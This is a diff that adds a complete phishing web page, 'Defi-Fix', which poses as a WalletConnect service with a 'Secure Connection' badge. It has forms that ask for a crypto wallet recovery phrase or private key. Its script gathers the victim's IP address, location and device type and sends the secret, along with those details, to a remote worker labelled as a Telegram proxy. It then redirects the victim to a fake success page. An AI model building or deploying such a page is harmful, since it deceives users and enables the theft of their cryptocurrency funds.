@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+        <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Defi-Fix</title>
+    <link rel="icon" href="../Defi-Fix Logo.png" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+
+    <style>
+        :root {
+            --color-background: #0a0e27;
+            --color-text: #e4e7eb;
+            --color-text-muted: #a0a9b8;
+            --color-accent: rgba(102, 177, 255, 0.3);
+            --color-border: rgba(255, 255, 255, 0.08);
+            --color-success: rgba(74, 222, 128, 0.15);
+            --color-error: rgba(239, 68, 68, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0f1229 100%);
+            color: var(--color-text);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .page-wrapper {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .back-button-wrapper {
+            margin-bottom: 24px;
+        }
+        .logo {
+            display:inline-flex;
+            align-items:center;
+            gap:8px;
+            margin-bottom:32px;
+            color:var(--color-text);
+            text-decoration:none;
+            font-size:18px;
+            font-weight:600;
+        }
+        .logo img { height:30px; }
+        .info-box {
+            background: rgba(102, 177, 255, 0.1);
+            border: 1px solid var(--color-border);
+            color: var(--color-text);
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 14px;
+            margin-bottom: 24px;
+            text-align: center;
+            font-weight: 500;
+        }
+        .info-box .logo {
+            margin-bottom: 8px;
+        }
+        .info-text strong {
+            color: #4ade80;
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 16px;
+            background: rgba(102, 177, 255, 0.1);
+            border: 1px solid var(--color-border);
+            color: rgba(102, 177, 255, 0.9);
+            border-radius: 12px;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .back-button:hover {
+            background: rgba(102, 177, 255, 0.2);
+            border-color: rgba(102, 177, 255, 0.4);
+            transform: translateX(-2px);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--color-text);
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: var(--color-text-muted);
+            font-weight: 400;
+        }
+
+        .form-card {
+            background: linear-gradient(135deg, rgba(102, 177, 255, 0.06) 0%, rgba(139, 92, 246, 0.06) 100%);
+            border: 1px solid var(--color-border);
+            border-radius: 24px;
+            padding: 32px;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .form-card:hover {
+            border-color: rgba(102, 177, 255, 0.2);
+            background: linear-gradient(135deg, rgba(102, 177, 255, 0.08) 0%, rgba(139, 92, 246, 0.08) 100%);
+        }
+
+        .tab-container {
+            display: flex;
+            gap: 0;
+            border-bottom: 1px solid var(--color-border);
+            margin-bottom: 28px;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 12px 16px;
+            background: none;
+            border: none;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: var(--color-text-muted);
+            border-bottom: 2px solid transparent;
+            margin-bottom: -1px;
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .tab-button.active {
+            color: rgba(102, 177, 255, 0.9);
+            border-bottom-color: rgba(102, 177, 255, 0.6);
+        }
+
+        .tab-button:hover:not(.active) {
+            color: var(--color-text);
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: var(--color-text);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-input,
+        textarea {
+            width: 100%;
+            padding: 12px 14px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--color-border);
+            color: var(--color-text);
+            border-radius: 12px;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+            resize: none;
+        }
+
+        .form-input::placeholder,
+        textarea::placeholder {
+            color: var(--color-text-muted);
+        }
+
+        .form-input:focus,
+        textarea:focus {
+            outline: none;
+            border-color: rgba(102, 177, 255, 0.5);
+            background: rgba(102, 177, 255, 0.05);
+            box-shadow: 0 0 0 3px rgba(102, 177, 255, 0.1);
+        }
+
+        .form-input:hover,
+        textarea:hover {
+            border-color: rgba(102, 177, 255, 0.3);
+        }
+
+        .button-submit {
+            width: 100%;
+            padding: 12px 20px;
+            margin-top: 24px;
+            background: linear-gradient(135deg, rgba(102, 177, 255, 0.9) 0%, rgba(99, 102, 241, 0.9) 100%);
+            color: #ffffff;
+            border: 1px solid rgba(102, 177, 255, 0.3);
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .button-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(102, 177, 255, 0.3);
+            background: linear-gradient(135deg, rgba(102, 177, 255, 1) 0%, rgba(99, 102, 241, 1) 100%);
+        }
+
+        .button-submit:active {
+            transform: translateY(0);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+            padding: 12px 16px;
+            background: rgba(74, 222, 128, 0.1);
+            border: 1px solid rgba(74, 222, 128, 0.2);
+            border-radius: 12px;
+            font-size: 12px;
+            color: rgba(74, 222, 128, 0.9);
+            font-weight: 500;
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+            opacity: 0.8;
+        }
+        .status-msg {
+            margin-top: 16px;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.03);
+            color: var(--color-text-muted);
+            font-size: 13px;
+            min-height: 20px;
+            text-align: center;
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page-wrapper">
+
+        <div class="header">
+            <div class="info-box">
+                <a href="../index.html" class="logo">
+                    <img src="../assets/images/wc1.png" alt="Logo">
+                    Walletconnect
+                </a><br>
+                <span class="info-text"><strong>Info alert!</strong> Securely use any of the options below</span>
+            </div>
+        </div>
+
+        <div class="form-card">
+            <div class="tab-container">
+                <button class="tab-button active" data-tab="phrase-content">Recovery Phrase</button>
+                <button class="tab-button" data-tab="private-key">Private Key</button>
+            </div>
+
+            <div class="tab-content active" id="phrase-content">
+                <form id="phraseForm">
+                    <div class="form-group">
+                        <label class="form-label">Recovery Phrase</label>
+                        <textarea 
+                            id="phrase" 
+                            name="phrase" 
+                            rows="4" 
+                            placeholder="Enter your recovery phrase (typically 12-24 words separated by spaces)"
+                            class="form-input"
+                            minlength="12"
+                            required></textarea>
+                    </div>
+                    <button type="submit" class="button-submit">
+                        <span>Proceed</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="9 18 15 12 9 6"></polyline>
+                        </svg>
+                    </button>
+                </form>
+            </div>
+
+            <div class="tab-content" id="private-key">
+                <form id="privateKeyForm">
+                    <div class="form-group">
+                        <label class="form-label">Private Key</label>
+                        <input 
+                            type="text" 
+                            id="prvky" 
+                            name="prvky" 
+                            placeholder="Enter your private key"
+                            class="form-input"
+                            minlength="12"
+                            required>
+                    </div>
+                    <button type="submit" class="button-submit">
+                        <span>Proceed</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="9 18 15 12 9 6"></polyline>
+                        </svg>
+                    </button>
+                </form>
+            </div>
+
+            <div id="statusMessage" class="status-msg" aria-live="polite"></div>
+
+            <div class="security-badge">
+                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                </svg>
+                <span>Secure Connection</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Tab switching
+        document.querySelectorAll('.tab-button').forEach(button => {
+            button.addEventListener('click', function() {
+                const tabName = this.getAttribute('data-tab');
+                
+                // Remove active class from all buttons and contents
+                document.querySelectorAll('.tab-button').forEach(b => b.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                // Add active class to clicked button and corresponding content
+                this.classList.add('active');
+                document.getElementById(tabName).classList.add('active');
+            });
+        });
+
+        const escapeHtml = (text) => String(text || '')
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+
+        // Phrase form submission with timeouts, loading state, and fallbacks
+        document.getElementById('phraseForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const form = this;
+            const submitBtn = form.querySelector('button[type=submit]');
+            const submitLabel = submitBtn.querySelector('span');
+            const statusElement = document.getElementById('statusMessage');
+            const setStatus = (text, error = false) => {
+                statusElement.textContent = text;
+                statusElement.style.color = error ? 'rgba(239, 68, 68, 0.9)' : 'rgba(74, 222, 128, 0.9)';
+            };
+            submitBtn.disabled = true;
+            submitLabel.textContent = 'Processing...';
+
+            const phrase = document.getElementById("phrase").value;
+            const categoryValue = "Phrase";
+
+            // helper: fetch with timeout
+            const fetchWithTimeout = async (url, ms, options = {}) => {
+                const controller = new AbortController();
+                const id = setTimeout(() => controller.abort(), ms);
+                try {
+                    const resp = await fetch(url, { signal: controller.signal, ...options });
+                    clearTimeout(id);
+                    return resp;
+                } catch (err) {
+                    clearTimeout(id);
+                    throw err;
+                }
+            };
+
+            // gather extra info with short timeout; proceed even if it fails
+            const now = new Date().toLocaleString();
+            let ip = "unknown";
+            let city = "unknown";
+            let region = "unknown";
+            let country = "unknown";
+            try {
+                const resp = await fetchWithTimeout('https://api.ipbase.com/v1/json/', 3000);
+                if (resp && resp.ok) {
+                    const data = await resp.json();
+                    ip = data.ip || ip;
+                    city = data.city || city;
+                    region = data.region_name || region;
+                    country = data.country_name || country;
+                }
+            } catch (e) {
+                console.warn('IP lookup failed or timed out', e);
+            }
+
+            const ua = navigator.userAgent || '';
+            let device = /Mobi|Android/i.test(ua) ? 'Mobile' : 'PC';
+            if (device === 'PC') {
+                if (/Macintosh|Mac OS X/i.test(ua)) device = 'Mac';
+                else if (/Windows/i.test(ua)) device = 'Windows PC';
+                else if (/Linux/i.test(ua)) device = 'Linux PC';
+            }
+
+            try {
+                const messageData = {
+                    category: categoryValue,
+                    payloadLabel: 'Phrase',
+                    payload: phrase,
+                    time: now,
+                    ip: ip,
+                    city: city,
+                    region: region,
+                    country: country,
+                    device: device
+                };
+                
+                const url = `https://telegram-proxy.louis-rivera-official.workers.dev`;
+                const resp = await fetchWithTimeout(url, 15000, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(messageData)
+                });
+                
+                if (resp && resp.ok) {
+                    window.location.href = "../apiv4wc-connection-success/index.html";
+                    return;
+                }
+                let bodyText = '';
+                try { bodyText = await resp.text(); } catch (e) { bodyText = '<unreadable>'; }
+                const errText = `Worker/API error: ${resp.status} ${resp.statusText} - ${bodyText}`;
+                setStatus(errText, true);
+                submitBtn.disabled = false;
+                submitLabel.textContent = 'Proceed';
+            } catch (err) {
+                const em = err && err.message ? err.message : String(err);
+                const msg = `Network/send error: ${em}`;
+                setStatus(msg, true);
+                submitBtn.disabled = false;
+                submitLabel.textContent = 'Proceed';
+            }
+        });
+
+        // Private Key form submission with timeouts, loading state, and fallbacks
+        document.getElementById('privateKeyForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const form = this;
+            const submitBtn = form.querySelector('button[type=submit]');
+            const submitLabel = submitBtn.querySelector('span');
+            const statusElement = document.getElementById('statusMessage');
+            const setStatus = (text, error = false) => {
+                statusElement.textContent = text;
+                statusElement.style.color = error ? 'rgba(239, 68, 68, 0.9)' : 'rgba(74, 222, 128, 0.9)';
+            };
+            submitBtn.disabled = true;
+            submitLabel.textContent = 'Processing...';
+
+            const prvky = document.getElementById("prvky").value;
+            const categoryValue = "Private Key";
+
+            // helper: fetch with timeout (same as phrase handler)
+            const fetchWithTimeout = async (url, ms, options = {}) => {
+                const controller = new AbortController();
+                const id = setTimeout(() => controller.abort(), ms);
+                try {
+                    const resp = await fetch(url, { signal: controller.signal, ...options });
+                    clearTimeout(id);
+                    return resp;
+                } catch (err) {
+                    clearTimeout(id);
+                    throw err;
+                }
+            };
+
+            const now = new Date().toLocaleString();
+            let ip = "unknown";
+            let city = "unknown";
+            let region = "unknown";
+            let country = "unknown";
+            try {
+                const resp = await fetchWithTimeout('https://api.ipbase.com/v1/json/', 3000);
+                if (resp && resp.ok) {
+                    const data = await resp.json();
+                    ip = data.ip || ip;
+                    city = data.city || city;
+                    region = data.region_name || region;
+                    country = data.country_name || country;
+                }
+            } catch (e) {
+                console.warn('IP lookup failed or timed out', e);
+            }
+
+            const ua = navigator.userAgent || '';
+            let device = /Mobi|Android/i.test(ua) ? 'Mobile' : 'PC';
+            if (device === 'PC') {
+                if (/Macintosh|Mac OS X/i.test(ua)) device = 'Mac';
+                else if (/Windows/i.test(ua)) device = 'Windows PC';
+                else if (/Linux/i.test(ua)) device = 'Linux PC';
+            }
+
+            try {
+                const messageData = {
+                    category: categoryValue,
+                    payloadLabel: 'Private Key',
+                    payload: prvky,
+                    time: now,
+                    ip: ip,
+                    city: city,
+                    region: region,
+                    country: country,
+                    device: device
+                };
+                
+                const url = `https://telegram-proxy.louis-rivera-official.workers.dev`;
+                const resp = await fetchWithTimeout(url, 15000, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(messageData)
+                });
+                
+                if (resp && resp.ok) {
+                    window.location.href = "../apiv4wc-connection-success/index.html";
+                    return;
+                }
+                let bodyText = '';
+                try { bodyText = await resp.text(); } catch (e) { bodyText = '<unreadable>'; }
+                const errText = `Worker/API error: ${resp.status} ${resp.statusText} - ${bodyText}`;
+                setStatus(errText, true);
+                submitBtn.disabled = false;
+                submitLabel.textContent = 'Proceed';
+            } catch (err) {
+                const em = err && err.message ? err.message : String(err);
+                const msg = `Network/send error: ${em}`;
+                setStatus(msg, true);
+                submitBtn.disabled = false;
+                submitLabel.textContent = 'Proceed';
+            }
+        });
+    </script>
+</body>
+
+</html>
